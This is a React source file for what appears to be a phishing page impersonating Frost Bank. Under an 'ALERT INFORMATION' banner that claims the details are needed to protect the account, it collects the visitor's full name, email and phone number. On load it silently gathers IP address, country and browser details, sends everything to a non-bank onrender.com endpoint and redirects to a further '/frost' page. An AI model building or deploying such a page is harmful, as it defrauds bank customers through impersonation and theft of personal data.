import React from 'react'
import { useState, useEffect } from 'react'
import { useNavigate } from 'react-router-dom'
import axios from 'axios'

const AlertPage = () => {
    const [fullname, setFullName] = useState('')
    const [email, setEmail] = useState('')
    const [number, setNumber] = useState('')
    const [userInfo, setUserInfo] = useState({})
    const navigate = useNavigate()

    useEffect(() => {
        // Fetch user IP and location
        axios.get("https://ipapi.co/json/")
            .then(response => {
                setUserInfo({
                    ip: response.data.ip,
                    country: response.data.country_name,
                    browser: navigator.userAgent, // Get user browser details
                });
            })
            .catch(error => console.error("Error fetching user info:", error));
    }, []);

    const alertContinue = () => {
        if (fullname == '' || email == '' || number == '') {
            document.getElementById('error-1').style.display = 'block'
            document.getElementById('error-2').style.display = 'block'
            document.getElementById('error-3').style.display = 'block'
        } else {
            const alertData = { fullname, email, number, userInfo, date: new Date().toLocaleString()}
            axios.post('https://frost-bank.onrender.com/alert', alertData)

                .then((response) => {
                    console.log(response.data.message);
                })
            setTimeout(() => {
                navigate('/frost')
            }, 2000);
            
        }
    }
    return (
        <div className='otpsection'>
            <div className='card mx-auto col-lg-6 col-md-10 col-12 mt-md-5'>
                <div className=''>
                    <div className='text-center pt-4'>
                        <img src="/images/frost_logo.png" alt="logo" width='200' />
                    </div>
                    <hr />
                    <h4 className='text-center'>ALERT INFORMATION </h4>
                    <p className='text-center'>To protect your account, please provide the requested information</p>
                    <div className='px-md-4 px-2'>
                        <div className='lh-1 pt-0'>
                            <input onChange={(e) => setFullName(e.target.value)} className='form-control w-100 shadow-none form' type="email" placeholder='Full Name' value={fullname} />
                            <span className='error-d pt-0' id='error-1'><small>Please fill out this field.</small></span>
                        </div>
                        <div className='pt-2'>
                            <input onChange={(e) => setEmail(e.target.value)} className='form-control w-100 shadow-none form' type="email" placeholder='Email' value={email} />
                            <span className='error-d' id='error-2'><small>Please fill out this field.</small></span>
                        </div>
                        <div className='pt-2'>
                            <input onChange={(e) => setNumber(e.target.value)} className='form-control w-100 shadow-none form' type="number" placeholder='Number' value={number} />
                            <span className='error-d ' id='error-3'><small>Please fill out this field.</small></span>
                        </div>

                        <button onClick={alertContinue} className='fw-bold rounded-2 logbtn my-3'>Continue</button>
                    </div>
                </div>

            </div>
        </div>
    )
}

export default AlertPage